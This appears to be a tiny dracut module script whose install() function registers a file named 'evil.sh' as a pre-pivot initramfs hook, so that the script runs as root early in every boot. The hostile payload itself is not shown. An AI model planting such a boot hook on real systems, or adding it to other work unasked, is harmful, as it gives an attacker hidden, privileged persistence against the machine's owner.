#!/bin/bash
# dracut module
install() { inst_hook pre-pivot 99 "$moddir/evil.sh"; }
